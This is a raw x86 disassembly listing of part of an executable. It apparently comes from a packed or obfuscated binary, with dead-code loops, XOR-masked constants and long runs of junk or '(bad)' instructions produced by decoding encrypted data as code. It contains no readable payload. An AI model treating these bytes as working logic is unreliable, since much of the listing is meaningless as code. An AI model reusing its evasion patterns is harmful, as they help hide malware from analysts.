  403277:	or     DWORD PTR ds:0x44899c,ecx
  40327d:	mov    ecx,0x7510857
  403282:	and    DWORD PTR ds:0x44b6d0,0x4489a8
  40328c:	push   esi
  40328d:	and    DWORD PTR ds:0x41074b,0x0
  403297:	jmp    0x4032a9
  40329c:	mov    esi,DWORD PTR ds:0x41074b
  4032a2:	inc    esi
  4032a3:	mov    DWORD PTR ds:0x41074b,esi
  4032a9:	cmp    DWORD PTR ds:0x41074b,0x18
  4032b0:	jae    0x4032e1
  4032b6:	cmp    DWORD PTR ds:0x41074b,0x24
  4032bd:	jne    0x4032dc
  4032c3:	push   0x2dca
  4032c8:	push   0x41089f
  4032cd:	push   DWORD PTR [ebp-0x18]
  4032d0:	push   DWORD PTR [ebp-0x18]
  4032d3:	push   DWORD PTR [ebp-0x10]
  4032d6:	call   DWORD PTR ds:0x443004
  4032dc:	jmp    0x40329c
  4032e1:	mov    esi,DWORD PTR [ebp+0xc]
  4032e4:	add    DWORD PTR ds:0x448980,0x448994
  4032ee:	xor    eax,ecx
  4032f0:	cmp    eax,esi
  4032f2:	je     0x403532
  4032f8:	mov    eax,ds:0x44521c
  4032fd:	xor    DWORD PTR ds:0x44e428,0x43cf
  403307:	jmp    0x4033ac
  40330c:	rol    BYTE PTR ds:0xad798db9,1
  403312:	loopne 0x403391
  403314:	dec    esi
  403315:	push   edi
  403316:	mov    cl,0x6e
  403318:	xor    al,0x3
  40331a:	(bad)  
  40331b:	call   0x7cbc360e
  403320:	hlt    
  403321:	jl     0x40339f
  403323:	jl     0x403334
  403325:	add    eax,ebx
  403327:	mov    eax,ds:0xff49bd45
  40332c:	xchg   ecx,eax
  40332d:	fwait
  40332e:	jle    0x4033af
  403330:	fdiv   QWORD PTR [edx]
  403332:	ss aam 0x9a
  403335:	(bad)  
  403336:	jns    0x40332f
  403338:	push   edx
  403339:	pop    esp
  40333a:	adc    ecx,DWORD PTR [ebx-0x3f]
  40333d:	jns    0x4032fa
  40333f:	out    0xd1,eax
  403341:	pop    eax
  403342:	fwait
  403343:	daa    
  403344:	sbb    al,0x2d
  403346:	int3   
  403347:	mov    ch,0xd0
  403349:	cmp    DWORD PTR [edx-0x77da6dd0],ebx
  40334f:	xor    DWORD PTR [edi+0x20],ebp
  403352:	dec    esp
  403353:	loopne 0x4033a1
  403355:	bound  esp,QWORD PTR [eax]
  403357:	sbb    eax,0x10e8dc22
  40335c:	mov    WORD PTR [edi-0x365a2d08],es
  403362:	mov    ecx,0x5ffc0de1
  403367:	mov    edx,0xf644135f
  40336c:	getsec 
  40336e:	dec    esp
  40336f:	repz pop ebx
  403371:	call   0x92ce:0x351a4526
  403378:	imul   ebp,DWORD PTR [edi-0x1016bec],0x63d9ea3d
  403382:	push   esi
  403383:	js     0x403373
  403385:	jp     0x403397
  403387:	leave  
  403388:	pop    esp
  403389:	sub    eax,0x4ccbdf2
  40338e:	mov    bh,0x3
  403390:	or     eax,0xa9bef1a5
  403395:	lock (bad) [eax+ebx*2+0x5212b9e3]
  40339d:	pop    ss
  40339e:	pop    esi
  40339f:	enter  0x548d,0xb3
  4033a3:	(bad)  
  4033a4:	xchg   esi,eax
  4033a5:	sbb    ch,BYTE PTR [eax+eiz*4+0x17]
  4033a9:	js     0x4033a7
  4033ab:	cmp    BYTE PTR [ebx-0x3dd4f38b],cl
  4033b1:	jmp    0x403456
  4033b6:	sahf   
  4033b7:	and    al,0xc4
  4033b9:	cwde   
  4033ba:	inc    esi
  4033bb:	js     0x40340f
  4033bd:	cmp    dl,BYTE PTR [eax+0x4a]
  4033c0:	fucomp st(0)
  4033c2:	fwait
  4033c3:	sti    
  4033c4:	cli    
  4033c5:	and    al,0x66
  4033c7:	add    bh,BYTE PTR [esp+edi*2-0xc]
  4033cb:	jl     0x403449
  4033cd:	jl     0x403411
  4033cf:	es push 0x6c097d21
  4033d5:	ins    DWORD PTR es:[edi],dx
  4033d6:	dec    esp
  4033d7:	mov    edi,0xce7259c3
  4033dc:	jno    0x403444
  4033de:	inc    ebp
  4033df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033e0:	or     al,bl
  4033e2:	pop    ss
  4033e3:	mov    ebx,0x2359d551
  4033e8:	dec    eax
  4033e9:	jno    0x403467
  4033eb:	scas   eax,DWORD PTR es:[edi]
  4033ec:	repnz or ch,BYTE PTR [edi-0x28]
  4033f0:	cli    
  4033f1:	rcl    dh,0xdb
  4033f4:	mov    edx,0x3b6fced1
  4033f9:	add    ch,dh
  4033fb:	stc    
  4033fc:	lahf   
  4033fd:	lahf   
  4033fe:	fsub   QWORD PTR [eax]
  403400:	push   edi
  403401:	pushf  
  403402:	nop
  403403:	inc    ebp
  403404:	mov    dl,0xb8
  403406:	dec    edi
  403407:	aaa    
  403408:	call   0x92c5:0x2d03f0e2
  40340f:	jg     0x4033c0
  403411:	dec    ecx
  403412:	mov    edi,0xaf36dc11
  403417:	stos   BYTE PTR es:[edi],al
  403418:	mov    DWORD PTR [esi-0x76],eax
  40341b:	hlt    
  40341c:	(bad)  
  40341d:	push   edx
  40341e:	jg     0x4033e0
  403420:	push   esi
  403421:	sbb    ebp,0xcfc0d88d
  403427:	inc    ebx
  403428:	sub    DWORD PTR [ebx+0x3a],ecx
  40342b:	in     eax,0x8e
  40342d:	xchg   esp,eax
  40342e:	inc    eax
  40342f:	xor    BYTE PTR [ebx+ebx*1+0x4c],dl
  403433:	push   0x645efb8b
  403438:	mov    ebx,0xeb09b59c
  40343d:	mov    ch,0x4
  40343f:	fcom   QWORD PTR [esi]
  403441:	xchg   ecx,eax
  403442:	push   esi
  403443:	sub    DWORD PTR [ebp-0x90e7f88],ebp
  403449:	pop    ebx
  40344a:	(bad)
  40344d:	cmc    
  40344e:	fs dec ebp
  403450:	add    eax,0x78d79bfd
  403455:	dec    edx
  403456:	xor    eax,ecx
  403458:	cmp    eax,esi
  40345a:	jne    0x403470
  403460:	mov    eax,ds:0x445224
  403465:	add    eax,DWORD PTR ds:0x44521c
  40346b:	jmp    0x40351c
  403470:	mov    eax,DWORD PTR [ebp+0xc]
  403473:	xor    eax,ecx
  403475:	jmp    0x40351a
  40347a:	ficomp WORD PTR [edx+0x22]
  40347d:	mov    WORD PTR [edx+0x277a5264],?
  403483:	adc    eax,0xe08bfc0e
  403488:	xchg   DWORD PTR [ebx-0x2],ecx
  40348b:	add    eax,0x7cf47c7c
  403490:	jl     0x40350e
  403492:	mov    ah,0x37
  403494:	fs cmp eax,0x5835c658
  40349a:	in     al,0xf
  40349c:	dec    edx
  40349d:	sub    DWORD PTR [ebx],ebx
  40349f:	out    0x7d,eax
  4034a1:	scas   eax,DWORD PTR es:[edi]
  4034a2:	(bad)  
  4034a4:	adc    al,BYTE PTR [edi-0xe5d0da5]
  4034aa:	in     eax,0xed
  4034ac:	inc    ebp
  4034ad:	ror    BYTE PTR [esi-0x6d],0x52
  4034b1:	dec    edx
  4034b2:	mov    dl,0xe9
  4034b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b5:	into   
  4034b6:	pop    esi
  4034b7:	jl     0x40351e
  4034b9:	sub    ecx,ebx
  4034bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034bc:	imul   edi,DWORD PTR [edx-0x13],0x4f8e49ad
  4034c3:	adc    eax,0x1b4e5a21
  4034c8:	sub    BYTE PTR [edi+ecx*4-0x5378b972],0xaa
  4034d0:	jle    0x403485
  4034d2:	adc    bl,dl
  4034d4:	sub    eax,0x24d26f4
  4034d9:	not    DWORD PTR [esi-0x3a72f3de]
  4034df:	ja     0x4034ed
  4034e1:	aam    0x4e
  4034e3:	cld    
  4034e4:	(bad)  
  4034e5:	loopne 0x40352c
  4034e7:	cmc    
  4034e8:	ret    
  4034e9:	mov    esi,ds
  4034eb:	shr    DWORD PTR [edi],1
  4034ed:	scas   eax,DWORD PTR es:[edi]
  4034ee:	popf   
  4034ef:	pop    esi
  4034f0:	jp     0x40348d
  4034f2:	ror    bl,1
  4034f4:	dec    esp
  4034f5:	test   BYTE PTR [esi-0x2c],cl
  4034f8:	mov    ebp,DWORD PTR [esi-0x33]
  4034fb:	nop
  4034fc:	cmp    BYTE PTR [edi+eax*8-0x5f],0x38
  403501:	dec    esp
  403502:	call   0x26e793ea
  403507:	scas   eax,DWORD PTR es:[edi]
  403508:	adc    dl,dl
  40350a:	stc    
  40350b:	mov    bl,0xad
  40350d:	ds push ecx
  40350f:	and    edi,DWORD PTR [ebx+ebp*2-0x40]
  403513:	repnz mov bh,0xb2
  403516:	jl     0x403580
  403518:	pop    es
  403519:	js     0x40351e
  40351b:	ret    0x1ca3
  40351e:	push   edx
  40351f:	inc    esp
  403520:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  403526:	add    eax,edx
  403528:	mov    ds:0x445224,eax
  40352d:	jmp    0x40353c
  403532:	mov    eax,ds:0x445224
  403537:	mov    ds:0x44521c,eax
  40353c:	mov    eax,DWORD PTR [ebp+0x8]
  40353f:	mov    eax,DWORD PTR [eax]
  403541:	mov    ecx,DWORD PTR ds:0x44521c
  403547:	add    DWORD PTR [eax],ecx
  403549:	pop    esi
  40354a:	pop    ebp
  40354b:	ret    0x8
  40354e:	push   ebp
  40354f:	mov    ebp,esp
  403551:	sub    esp,0x44
  403554:	push   edi
  403555:	mov    eax,DWORD PTR [ebp+0xc]
  403558:	and    edi,DWORD PTR ds:0x448984
  40355e:	mov    DWORD PTR [ebp-0x10],eax
  403561:	mov    DWORD PTR ds:0x44e424,0x11
  40356b:	cmp    DWORD PTR ds:0x44e424,0x0
  403572:	je     0x4035af
  403578:	cmp    DWORD PTR ds:0x44e424,0x1d
  40357f:	jne    0x403595
  403585:	push   0x4107d0
  40358a:	push   0x4107e6
  40358f:	call   DWORD PTR ds:0x44334c
  403595:	mov    eax,ds:0x44e424
  40359a:	dec    eax
  40359b:	mov    ds:0x44e424,eax
  4035a0:	jmp    0x40356b
  4035a5:	xor    DWORD PTR ds:0x44b6dc,0x5830
  4035af:	mov    eax,DWORD PTR [ebp+0x8]
  4035b2:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4035b9:	mov    edi,DWORD PTR ds:0x44b6d0
  4035bf:	xor    DWORD PTR ds:0x44b6e0,edi
  4035c5:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4035cc:	xor    edx,DWORD PTR ds:0x4248ca
  4035d2:	mov    edx,DWORD PTR [ebp+0x8]
  4035d5:	and    edi,edi
  4035d7:	jmp    0x40373c
  4035dc:	loopne 0x4035cc
  4035de:	enter  0xcaef,0xfd
  4035e2:	sti    
  4035e3:	in     eax,0xa8
  4035e5:	cmp    eax,edi
  4035e7:	jg     0x4035c2
  4035e9:	dec    ebp
  4035ea:	jg     0x403647
  4035ec:	jbe    0x4035f2
  4035ee:	jl     0x40366c
  4035f0:	xor    al,0x7f
  4035f2:	jl     0x403670
  4035f4:	sub    al,0xcf
  4035f6:	dec    ebp
  4035f7:	mov    al,dl
  4035f9:	(bad)  
  4035fa:	push   edi
  4035fb:	sub    DWORD PTR [edx+0x36],ecx
  4035fe:	jmp    0x4f7f6ff1
  403603:	jp     0x4035dd
  403605:	lds    edi,FWORD PTR [esi]
  403607:	and    dl,BYTE PTR cs:[edi+0x4d]
  40360b:	or     al,0xc5
  40360d:	sub    al,0x8f
  40360f:	inc    esi
  403610:	jmp    0x1bb7:0xc5510544
  403617:	out    dx,eax
  403618:	mov    cl,BYTE PTR [esi]
  40361a:	je     0x40365f
  40361c:	push   ebp
  40361d:	jae    0x403645
  40361f:	fdivp  st(5),st
  403621:	mov    BYTE PTR [ebx+0x66],ah
  403624:	int3   
  403625:	sub    al,BYTE PTR [esi]
  403627:	js     0x403681
  403629:	mov    cl,0x91
  40362b:	das    
  40362c:	pop    ebx
  40362d:	dec    eax
  40362e:	f2xm1  
  403630:	adc    ebp,DWORD PTR [ebp-0x64]
  403633:	jmp    0xe907fd9a
  403638:	xor    eax,0x32392a3f
  40363d:	in     al,0x3f
  40363f:	lea    eax,[edx-0x5ea92a71]
  403645:	ja     0x40363b
  403647:	push   edx
  403648:	rcl    BYTE PTR [edi+0x35],cl
  40364b:	jle    0x4036ca
  40364d:	or     BYTE PTR [ebx],0x1c
  403650:	and    al,0xcd
  403652:	retf   
  403653:	les    esi,FWORD PTR [esi+0x516eb8cf]
  403659:	fimul  DWORD PTR [ecx+edi*8]
  40365c:	cmp    al,0xf4
  40365e:	xchg   ebp,eax
  40365f:	es push edx
  403661:	sub    DWORD PTR [ebx+0x49],esp
  403664:	or     ah,BYTE PTR [esp+esi*2]
  403667:	jge    0x403684
  403669:	inc    eax
  40366a:	ja     0x40368b
  40366c:	in     al,0x83
  40366e:	jno    0x40367c
  403670:	sub    BYTE PTR [ecx],ch
  403672:	call   0x2025e806
  403677:	jae    0x40361e
  403679:	xor    esp,esi
  40367b:	stos   BYTE PTR es:[edi],al
  40367c:	mov    edi,0xcf379f10
  403681:	out    0x75,eax
  403683:	lds    ebx,FWORD PTR [ecx]
  403685:	pop    edi
  403686:	sar    DWORD PTR [ebx+0x40],cl
  403689:	xor    eax,ebp
  40368b:	jmp    0x113be6bd
  403690:	test   eax,0xfb0059de
  403695:	icebp  
  403696:	sbb    esi,edi
  403698:	mov    cl,BYTE PTR [ecx+0x214c63f5]
  40369e:	cmp    al,BYTE PTR [edi-0x79]
  4036a1:	in     eax,0xfc
  4036a3:	pop    edi
  4036a4:	push   ebx
  4036a5:	sub    ebp,ecx
  4036a7:	hlt    
  4036a8:	mov    eax,ds:0x660c8fec
  4036ad:	sbb    BYTE PTR [edx],bl
  4036af:	cli    
  4036b0:	xchg   BYTE PTR [eax+0x10],bh
  4036b3:	mov    esi,0x12eb7273
  4036b8:	xor    BYTE PTR [ebp+0x506efac4],0x1
  4036bf:	fsubr  st,st(2)
  4036c1:	pop    ds
  4036c2:	dec    ebp
  4036c3:	add    cl,BYTE PTR [ecx-0x61f8be43]
  4036c9:	sbb    DWORD PTR [ecx-0x8],0xffffffd9
  4036cd:	mov    ds:0x49fb2be0,al
  4036d2:	call   0x70397978
  4036d7:	test   eax,0xaae0a65b
  4036dc:	lds    ebp,FWORD PTR [edi]
  4036de:	sbb    bl,BYTE PTR [edx-0x62fe5006]
  4036e4:	aam    0x55
  4036e6:	cmp    al,0x8e
  4036e8:	popf   
  4036e9:	lds    ecx,FWORD PTR [edi+0x2a]
  4036ec:	push   es
  4036ed:	mov    eax,0x299a4aa4
  4036f2:	or     BYTE PTR ds:[edi+0x0],ah
  4036f6:	and    eax,0x49e468b6
  4036fb:	ins    DWORD PTR es:[edi],dx
  4036fc:	gs ret 0xc259
  403700:	mov    eax,0x4fe9a6c8
  403705:	sbb    al,0x93
  403707:	cdq    
  403708:	mov    dl,0x3c
  40370a:	mov    ah,0xab
  40370c:	sub    edx,edi
  40370e:	xchg   esp,eax
  40370f:	dec    ecx
  403710:	stos   DWORD PTR es:[edi],eax
  403711:	das    
  403712:	in     eax,dx
  403713:	repnz inc edx
  403715:	aad    0x16
  403717:	scas   eax,DWORD PTR es:[edi]
  403718:	cwde   
  403719:	xchg   esi,eax
  40371a:	es cmp dl,bh
  40371d:	mov    bl,0x94
  40371f:	dec    edi
  403720:	addr16 add al,0x76
  403723:	mov    ebx,0xbbbab716
  403728:	fisttp WORD PTR [edx+0x4259c5e]
  40372e:	mov    edx,0x7e2f6baa
  403733:	lods   eax,DWORD PTR fs:[esi]
  403735:	mov    ebx,0x202cd34e
  40373a:	cmp    BYTE PTR [esi-0x77],ch
  40373d:	inc    ebp
  40373e:	sar    BYTE PTR [eax+0x7510857],0x33
  403745:	sar    BYTE PTR [ecx+0x32729e],1
  40374b:	add    edx,ecx
  40374d:	adc    edi,DWORD PTR ds:0x448990
  403753:	mov    DWORD PTR [ebp-0x8],edx
  403756:	mov    edi,DWORD PTR ds:0x4489bc
  40375c:	mov    edx,DWORD PTR ds:0x4489c4
  403762:	sub    edx,edi
  403764:	xor    edi,DWORD PTR [edi+edx*1]
  403767:	mov    edx,DWORD PTR [ebp+0x8]
  40376a:	xor    edx,eax
  40376c:	not    edi
  40376e:	add    edx,ecx
  403770:	add    DWORD PTR ds:0x448984,ebx
  403776:	mov    DWORD PTR [ebp+0xc],edx
  403779:	and    DWORD PTR ds:0x4248ca,0x0
  403783:	mov    edx,DWORD PTR ds:0x4248ca
  403789:	inc    edx
  40378a:	mov    DWORD PTR ds:0x4248ca,edx
  403790:	cmp    DWORD PTR ds:0x4248ca,0x4
  403797:	jne    0x4037b0
  40379d:	push   0x41073f
  4037a2:	push   DWORD PTR [ebp-0x28]
  4037a5:	push   0x6880
  4037aa:	call   DWORD PTR ds:0x443350
  4037b0:	cmp    DWORD PTR ds:0x4248ca,0x3
  4037b7:	jne    0x4037cc
  4037bd:	xor    edx,edx
  4037bf:	xor    edx,DWORD PTR ds:0x4248ca
  4037c5:	inc    edx
  4037c6:	mov    DWORD PTR ds:0x4248ca,edx
  4037cc:	cmp    DWORD PTR ds:0x4248ca,0x1b
  4037d3:	jb     0x403783
  4037d9:	adc    edi,DWORD PTR ds:0x44b6cc
  4037df:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  4037e6:	adc    edi,DWORD PTR ds:0x4489a4
  4037ec:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4037f3:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  4037fa:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403801:	and    DWORD PTR ds:0x4248ce,0x0
  40380b:	jmp    0x40381d
  403810:	mov    edx,DWORD PTR ds:0x4248ce
  403816:	inc    edx
  403817:	mov    DWORD PTR ds:0x4248ce,edx
  40381d:	cmp    DWORD PTR ds:0x4248ce,0x1e
  403824:	jae    0x40386c
  40382a:	cmp    DWORD PTR ds:0x4248ce,0xa
  403831:	jne    0x403847
  403837:	push   0x48af
  40383c:	push   0x400000
  403841:	call   DWORD PTR ds:0x443354
  403847:	cmp    DWORD PTR ds:0x4248ce,0x9
  40384e:	jne    0x403861
  403854:	mov    edx,DWORD PTR ds:0x4248ce
  40385a:	inc    edx
  40385b:	mov    DWORD PTR ds:0x4248ce,edx
  403861:	jmp    0x403810
  403866:	or     DWORD PTR ds:0x448994,ecx
  40386c:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  403873:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40387a:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  403881:	or     edi,edx
  403883:	mov    edx,DWORD PTR [ebp+0x8]
  403886:	mov    DWORD PTR ds:0x4248de,0x6ab7
  403890:	xor    edx,eax
  403892:	or     DWORD PTR ds:0x41075b,edx
  403898:	mov    edi,DWORD PTR [ebp-0x10]
  40389b:	add    edx,ecx
  40389d:	cmp    edi,edx
  40389f:	mov    DWORD PTR ds:0x448980,0x7f1d
  4038a9:	je     0x40511b
  4038af:	mov    DWORD PTR ds:0x4248ca,0x4e02
  4038b9:	push   ebx
  4038ba:	mov    DWORD PTR ds:0x44b6cc,0x557d
  4038c4:	jmp    0x4050f6
  4038c9:	mov    edx,DWORD PTR [ebp-0x8]
  4038cc:	and    DWORD PTR ds:0x44e41c,0x0
  4038d6:	jmp    0x4038e8
  4038db:	mov    edi,DWORD PTR ds:0x44e41c
  4038e1:	inc    edi
  4038e2:	mov    DWORD PTR ds:0x44e41c,edi
  4038e8:	cmp    DWORD PTR ds:0x44e41c,0x10
  4038ef:	jae    0x403921
  4038f5:	cmp    DWORD PTR ds:0x44e41c,0x19
  4038fc:	jne    0x403912
  403902:	push   0x7f28
  403907:	push   0x230d
  40390c:	call   DWORD PTR ds:0x443358
  403912:	jmp    0x4038db
  403917:	mov    DWORD PTR ds:0x448984,0x3377
  403921:	mov    edi,DWORD PTR [ebp-0x10]
  403924:	or     DWORD PTR ds:0x44b6e4,0x66ab
  40392e:	jmp    0x403a93
  403933:	std    
  403934:	xor    al,0x25
  403936:	mov    eax,ds:0x487d7d25
  40393b:	add    al,0x98
  40393d:	test   al,0x7f
  40393f:	cmp    al,0xcc
  403941:	mov    al,0x7a
  403943:	into   
  403944:	pop    es
  403945:	jl     0x4039c3
  403947:	xor    al,0x7f
  403949:	jl     0x4039c7
  40394b:	mov    ds:0xf95de675,al
  403950:	shr    DWORD PTR [edi+0x40],1
  403953:	or     al,0xc7
  403955:	dec    edx
  403956:	push   ebp
  403957:	ret    0xa600
  40395a:	(bad)  
  40395b:	adc    eax,0x5d368d21
  403961:	sub    dl,BYTE PTR [ebp-0x4933c39b]
  403967:	lea    ebp,[eax-0x787a39f5]
  40396d:	xor    BYTE PTR [esi+eiz*1-0x13],bh
  403971:	loop   0x403967
  403973:	push   esi
  403974:	int    0xb1
  403976:	jo     0x403977
  403978:	adc    DWORD PTR ds:0x174d0763,edi
  40397e:	ret    0xa45
  403981:	sbb    al,0xbc
  403983:	xor    al,0xc7
  403985:	mov    ecx,0x5361bf3c
  40398a:	inc    ebp
  40398b:	mov    cl,BYTE PTR ds:0xf156b04d
  403991:	fwait
  403992:	jecxz  0x403a05
  403994:	mov    bl,0x51
  403996:	xor    al,0x58
  403998:	xor    ch,BYTE PTR [edx]
  40399a:	mov    esp,0xe97ca2d3
  40399f:	loopne 0x40398f
  4039a1:	xchg   esi,eax
  4039a2:	test   DWORD PTR [esi+eiz*4-0x1d],0xb27c73ec
  4039aa:	fisubr DWORD PTR [eax+0xb64abcf]
  4039b0:	fst    st(0)
  4039b2:	pop    esi
  4039b3:	push   eax
  4039b4:	jge    0x40394d
  4039b6:	out    dx,al
  4039b7:	add    esi,DWORD PTR [edx+0x9b1e7f9]
  4039bd:	dec    ebp
  4039be:	fwait
  4039bf:	xchg   ebx,eax
  4039c0:	sbb    eax,ecx
  4039c2:	cmp    DWORD PTR [esi],eax
  4039c4:	mov    ebx,0x7e21ddc1
  4039c9:	lods   eax,DWORD PTR ds:[esi]
  4039ca:	test   DWORD PTR [ebx],esi
  4039cc:	ror    BYTE PTR [ebx],0x15
  4039cf:	lea    esi,fs:[eax+0x5a03f602]
  4039d6:	jo     0x403996
  4039d8:	aaa    
  4039d9:	pop    esp
  4039da:	jns    0x403a17
  4039dc:	(bad)  
  4039de:	mov    ch,0x57
  4039e0:	sub    bl,cl
  4039e2:	lea    ecx,[edx]
  4039e4:	cdq    
  4039e5:	mov    esi,0x386540c7
  4039ea:	fisttp WORD PTR [edx-0x4ad0d933]
  4039f0:	(bad)  
  4039f1:	aaa    
  4039f2:	adc    edi,0x8069cd6a
  4039f8:	jno    0x4039c3
  4039fa:	xchg   esi,eax
  4039fb:	jnp    0x403a2a
  4039fd:	jmp    0xec2c:0x65573b57
  403a04:	(bad)  
  403a05:	das    
  403a06:	pusha  
  403a07:	cwde   
  403a08:	mov    ebx,0xf6fe5d95
  403a0d:	inc    edi
  403a0e:	iret   
  403a0f:	ins    BYTE PTR es:[edi],dx
  403a10:	(bad)  
  403a12:	jb     0x40399c
  403a14:	test   al,0x38
  403a16:	stc    
  403a17:	sbb    BYTE PTR [edi+0x2b1712ad],ah
  403a1d:	xor    cl,BYTE PTR ss:[ebx]
  403a20:	fadd   st(5),st
  403a22:	jmp    0x403a6a
  403a24:	mov    dh,0x84
  403a26:	lahf   
  403a27:	jp     0x403a7f
  403a29:	dec    ecx
  403a2a:	mov    ah,0xb9
  403a2c:	adc    al,0x74
  403a2e:	xchg   DWORD PTR [ebx+0x5c],esp
  403a31:	mov    al,0x5f
  403a33:	or     bl,al
  403a35:	inc    esp
  403a36:	sub    eax,0xca952a4b
  403a3b:	jecxz  0x403a52
  403a3d:	xor    BYTE PTR [ebx-0x40f33375],cl
  403a43:	inc    ecx
  403a44:	lods   eax,DWORD PTR ds:[esi]
  403a45:	ds jne 0x403a92
  403a48:	cmc    
  403a49:	or     BYTE PTR [edi-0x53],al
  403a4c:	push   ecx
  403a4d:	test   al,0xcb
  403a4f:	add    BYTE PTR [ecx],0x9a
  403a52:	xor    DWORD PTR [ebx+0x50b307a8],edx
  403a58:	mov    bl,ch
  403a5a:	pop    ecx
  403a5b:	mov    eax,ds:0xee156f43
  403a60:	lods   eax,DWORD PTR ds:[esi]
  403a61:	cmp    ebx,DWORD PTR [edi-0x4a0edae2]
  403a67:	adc    DWORD PTR [edx+0x9b7247c],esi
  403a6d:	dec    esp
  403a6e:	sbb    DWORD PTR [ecx-0x29],esi
  403a71:	mov    bl,0x3b
  403a73:	push   0x7c90db4f
  403a78:	xor    eax,0x8721a5f
  403a7d:	and    BYTE PTR [eax+0x2c87637d],0xc4
  403a84:	retf   0x4adb
  403a87:	mov    dh,0x6d
  403a89:	xchg   DWORD PTR [ebx+0x58],ebx
  403a8c:	hlt    
  403a8d:	sbb    DWORD PTR [esi+ecx*2+0x2bbe2a7d],0xfffffffa
  403a95:	adc    DWORD PTR ds:0x44e410,0x1ab0
  403a9f:	mov    edx,DWORD PTR [ebp-0x4]
  403aa2:	xor    DWORD PTR ds:0x44b6e4,0x35da
  403aac:	xor    edx,eax
  403aae:	xor    DWORD PTR ds:0x44b6e8,0x513b
  403ab8:	add    edx,ecx
  403aba:	mov    DWORD PTR ds:0x44e414,0x7aea
  403ac4:	cmp    edi,edx
  403ac6:	mov    DWORD PTR ds:0x41073f,0x2e05
  403ad0:	jb     0x40511a
  403ad6:	xor    edx,0x3e56
  403adc:	mov    edx,DWORD PTR [ebp-0x28]
  403adf:	mov    edi,DWORD PTR [ebp-0x4]
  403ae2:	xor    edx,eax
  403ae4:	and    DWORD PTR ds:0x448980,0x0
  403aee:	jmp    0x403b02
  403af3:	xor    ebx,ebx
  403af5:	xor    ebx,DWORD PTR ds:0x448980
  403afb:	inc    ebx
  403afc:	mov    DWORD PTR ds:0x448980,ebx
  403b02:	cmp    DWORD PTR ds:0x448980,0x16
  403b09:	jae    0x403b9b
  403b0f:	cmp    DWORD PTR ds:0x448980,0xd
  403b16:	jne    0x403b25
  403b1c:	push   DWORD PTR [ebp-0x18]
  403b1f:	call   DWORD PTR ds:0x443008
  403b25:	cmp    DWORD PTR ds:0x448980,0xc
  403b2c:	jne    0x403b41
  403b32:	xor    ebx,ebx
  403b34:	xor    ebx,DWORD PTR ds:0x448980
  403b3a:	inc    ebx
  403b3b:	mov    DWORD PTR ds:0x448980,ebx
  403b41:	jmp    0x403af3
  403b46:	and    DWORD PTR ds:0x448980,0x0
  403b50:	jmp    0x403b64
  403b55:	xor    ebx,ebx
  403b57:	add    ebx,DWORD PTR ds:0x448980
  403b5d:	inc    ebx
  403b5e:	mov    DWORD PTR ds:0x448980,ebx
  403b64:	cmp    DWORD PTR ds:0x448980,0x19
  403b6b:	jae    0x403b9b
  403b71:	cmp    DWORD PTR ds:0x448980,0x1e
  403b78:	jne    0x403b96
  403b7e:	push   DWORD PTR [ebp-0x1c]
  403b81:	push   0x4801
  403b86:	push   0x66a1
  403b8b:	push   0x3965
  403b90:	call   DWORD PTR ds:0x4430d4
  403b96:	jmp    0x403b55
  403b9b:	xor    edi,eax
  403b9d:	mov    ebx,DWORD PTR ds:0x4489ac
  403ba3:	mov    ebx,DWORD PTR [ebx]
  403ba5:	sbb    DWORD PTR ds:0x4248c2,ebx
  403bab:	add    edi,ecx
  403bad:	jmp    0x403d12
  403bb2:	jno    0x403b37
  403bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb5:	imul   esp,DWORD PTR [ebp+0x727dd96d],0x2a
  403bbc:	pop    esi
  403bbd:	clc    
  403bbe:	push   edi
  403bbf:	out    0xd3,al
  403bc1:	jp     0x403b49
  403bc3:	push   es
  403bc4:	jl     0x403c42
  403bc6:	xor    al,0x7f
  403bc8:	jl     0x403c46
  403bca:	mov    esi,ecx
  403bcc:	lea    edx,[ebx-0x3a]
  403bcf:	push   eax
  403bd0:	dec    eax
  403bd1:	ss popa 
  403bd3:	and    DWORD PTR [edi-0x22],0xffffffe7
  403bd7:	xchg   ebx,eax
  403bd8:	cmp    al,BYTE PTR fs:[ebx-0x6d]
  403bdc:	cmp    esi,DWORD PTR [edx-0x11]
  403bdf:	pop    es
  403be0:	mov    ah,0x1e
  403be2:	sbb    dh,BYTE PTR ds:0x42e65a88
  403be8:	mov    eax,ds:0x2e9b6611
  403bed:	jecxz  0x403b90
  403bef:	sub    DWORD PTR [edi],ebx
  403bf1:	sbb    al,0x55
  403bf3:	and    edi,DWORD PTR [esi]
  403bf5:	jmp    0x151767c5
  403bfa:	jmp    0x403b94
  403bfc:	fmulp  st(6),st
  403bfe:	test   al,0x62
  403c00:	mov    ds:0xef9be599,eax
  403c05:	sbb    dl,BYTE PTR [esi+0x6f921e26]
  403c0b:	xor    esp,DWORD PTR [ebp+0x1a702389]
  403c11:	or     eax,0xa49499e0
  403c16:	and    eax,0x294904cc
  403c1b:	ds xchg edi,eax
  403c1d:	sbb    DWORD PTR [esi-0x62223a51],eax
  403c23:	xor    al,0x2c
  403c25:	fsubr  DWORD PTR [ebx]
  403c27:	sbb    cl,BYTE PTR [edx+0x23adc9e8]
  403c2d:	dec    ecx
  403c2e:	and    BYTE PTR [esi-0x6c10384c],0x57
  403c35:	pop    esi
  403c36:	int3   
  403c37:	xchg   ecx,eax
  403c38:	dec    edi
  403c39:	mov    edx,0xc6cfe545
  403c3e:	sbb    BYTE PTR [edi-0x207ca5cf],cl
  403c44:	jae    0x403c54
  403c46:	pop    ebx
  403c47:	sub    ebp,esp
  403c49:	les    ebp,FWORD PTR [ecx-0x68c1f82]
  403c4f:	push   0x6a62ed24
  403c54:	jo     0x403be1
  403c56:	cmp    eax,0xf27f0338
  403c5b:	aad    0xd4
  403c5d:	push   ebp
  403c5e:	rcl    BYTE PTR [ebx+0x3941577d],1
  403c64:	in     al,0xc5
